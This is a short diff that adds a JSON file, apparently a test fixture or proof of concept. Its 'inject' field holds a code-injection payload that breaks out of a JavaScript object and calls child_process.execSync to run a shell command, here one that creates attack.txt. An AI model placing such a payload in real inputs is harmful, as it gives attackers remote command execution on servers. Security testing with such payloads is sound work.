@@ -1,0 +1,4 @@
+{"asString": 1, 
+"name":2, 
+"inject": "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"
+}
